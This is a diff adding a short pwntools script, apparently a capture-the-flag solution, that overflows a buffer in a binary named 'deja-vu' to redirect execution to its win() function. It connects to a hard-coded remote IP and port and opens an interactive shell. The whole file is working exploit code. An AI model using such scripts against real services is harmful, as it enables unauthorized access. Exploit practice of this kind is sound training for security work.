@@ -1,0 +1,16 @@
+from pwn import *
+
+# Editable variables for easy tweaking
+target_ip   = "20.84.72.194"   # Remote server IP
+target_port = 5005            # Remote server port
+offset      = 72              # Number of bytes to reach the return address (from cyclic analysis)
+win_address = 0x4011f6        # Address of the win() function (from objdump)
+
+# Choose connection type: local testing or remote target. Uncomment the line you want to test and comment out the other:
+# io = process("./deja-vu") #local file
+io = remote(target_ip, target_port) #remote connection
+
+#yeet it at the bin and open shell
+payload = b"A" * offset + p64(win_address)
+io.sendline(payload)
+io.interactive()
